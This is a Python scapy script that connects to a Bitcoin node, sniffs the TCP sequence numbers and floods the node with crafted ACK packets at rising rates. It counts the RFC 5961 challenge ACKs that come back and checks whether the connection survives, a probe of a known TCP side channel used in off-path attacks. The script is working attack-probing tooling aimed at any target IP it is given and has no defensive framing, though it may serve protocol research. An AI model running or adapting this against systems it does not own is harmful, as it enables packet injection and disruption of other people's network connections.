import argparse
import csv
import hashlib
import os
import socket
import struct
import time
import select
from dataclasses import dataclass
from typing import Optional, List, Dict

try:
    from scapy.all import IP, TCP, send, conf, sniff
    from scapy.sendrecv import AsyncSniffer
except ImportError:
    print("Error: Please install scapy (pip install scapy)")
    exit(1)

conf.verb = 0

MAGIC_MAINNET = 0xD9B4BEF9


def sha256d(b: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(b).digest()).digest()


def checksum(payload: bytes) -> bytes:
    return sha256d(payload)[:4]


def build_msg(command: str, payload: bytes) -> bytes:
    cmd = command.encode("ascii")[:12].ljust(12, b"\x00")
    header = struct.pack("<L12sL4s", MAGIC_MAINNET, cmd, len(payload), checksum(payload))
    return header + payload


def pack_net_addr(ip: str, port: int) -> bytes:
    ip4 = socket.inet_pton(socket.AF_INET, ip)
    return struct.pack("<Q", 0) + b"\x00" * 10 + b"\xff\xff" + ip4 + struct.pack(">H", port)


def build_version_payload(my_ip, my_port, peer_ip, peer_port):
    return (
        struct.pack("<iQQ", 70016, 0, int(time.time())) +
        pack_net_addr(peer_ip, peer_port) +
        pack_net_addr(my_ip, my_port) +
        os.urandom(8) + b"\x14/ack-challenge-test/" + struct.pack("<i", 0) + b"\x01"
    )


class AckChallengeOracle:
    def __init__(self, target_ip: str, target_port: int, iface: Optional[str] = None):
        self.target_ip = target_ip
        self.target_port = target_port
        self.iface = iface or conf.iface
        self.sock = None
        self.l_ip = None
        self.l_port = None
        self.curr_seq = 0
        self.curr_ack = 0

    def connect(self):
        print(f"[*] Establishing base connection to {self.target_ip}...")
        self.sock = socket.create_connection((self.target_ip, self.target_port), timeout=5)
        self.l_ip, self.l_port = self.sock.getsockname()

        v_pay = build_version_payload(self.l_ip, self.l_port, self.target_ip, self.target_port)
        self.sock.sendall(build_msg("version", v_pay))

        print("[*] Syncing TCP sequence numbers...")
        bpf = f"tcp and src host {self.target_ip} and src port {self.target_port} and dst port {self.l_port}"

        ping_msg = build_msg("ping", os.urandom(8))
        self.sock.sendall(ping_msg)

        pkts = sniff(iface=self.iface, filter=bpf, count=1, timeout=2)
        if pkts:
            self.curr_seq = pkts[0][TCP].ack
            self.curr_ack = pkts[0][TCP].seq
            print(f"[+] Sync Complete. Next Seq: {self.curr_seq}, Next Ack: {self.curr_ack}")
        else:
            print("[!] Sync failed. Using random base (results may be inconsistent).")
            self.curr_seq = 1000
            self.curr_ack = 1000

    def check_connection(self) -> bool:
        if not self.sock:
            return False
        try:
            readable, _, _ = select.select([self.sock], [], [], 0.01)
            if readable:
                if len(self.sock.recv(1, socket.MSG_PEEK)) == 0:
                    return False
            self.sock.send(b"", socket.MSG_DONTWAIT)
            return True
        except:
            return False

    def run_sweep(self, rates: List[int], duration: int, rounds: int):
        results = []
        bpf = f"tcp and src host {self.target_ip} and dst port {self.l_port} and tcp[tcpflags] & tcp-ack != 0"

        for r in range(1, rounds + 1):
            print(f"\n=== Round {r} ===")
            if not self.check_connection():
                print("[!] Connection lost. Aborting.")
                break

            for pps in rates:
                print(f"[*] Injecting Challenge-Window ACK @ {pps} PPS...")
                sniffer = AsyncSniffer(iface=self.iface, filter=bpf, store=True)
                sniffer.start()

                total_to_send = pps * duration
                interval = 1.0 / pps

                challenge_ack_num = (self.curr_ack + 0x7FFFFFFF) % 0xFFFFFFFF

                for i in range(total_to_send):
                    pkt = IP(dst=self.target_ip) / TCP(
                        sport=self.l_port,
                        dport=self.target_port,
                        flags="A",
                        seq=self.curr_seq,
                        ack=challenge_ack_num
                    )
                    send(pkt, verbose=0)
                    time.sleep(interval)

                time.sleep(0.5)
                pkts = sniffer.stop()
                challenge_acks = len(pkts)
                alive = self.check_connection()

                print(
                    f"    [Result] Sent: {total_to_send} | Challenge ACKs: {challenge_acks} | Conn: {'ALIVE' if alive else 'CLOSED'}"
                )

                results.append({
                    "round": r,
                    "target_pps": pps,
                    "sent": total_to_send,
                    "received_acks": challenge_acks,
                    "conn_alive": int(alive)
                })

                if not alive:
                    return results
        return results


def main():
    parser = argparse.ArgumentParser(description="RFC 5961 Correct-Seq ACK Oracle")
    parser.add_argument("--target-ip", required=True)
    parser.add_argument("--target-port", type=int, default=8333)
    parser.add_argument("--out", default="challenge_results.csv")
    args = parser.parse_args()

    if os.getuid() != 0:
        print("Error: Must run as root.")
        return

    oracle = AckChallengeOracle(args.target_ip, args.target_port)
    try:
        oracle.connect()
        sweep_data = oracle.run_sweep(rates=[50, 100, 200], duration=3, rounds=3)

        print("\n" + "=" * 65)
        print(f"{'Round':<7} | {'PPS':<7} | {'Sent':<7} | {'ACKs':<7} | {'Status':<10}")
        print("-" * 65)
        for d in sweep_data:
            status = "ALIVE" if d["conn_alive"] else "DROPPED"
            print(f"{d['round']:<7} | {d['target_pps']:<7} | {d['sent']:<7} | {d['received_acks']:<7} | {status:<10}")

        with open(args.out, "w", newline="") as f:
            writer = csv.DictWriter(
                f,
                fieldnames=["round", "target_pps", "sent", "received_acks", "conn_alive"]
            )
            writer.writeheader()
            writer.writerows(sweep_data)
    finally:
        if oracle.sock:
            oracle.sock.close()


if __name__ == "__main__":
    main()
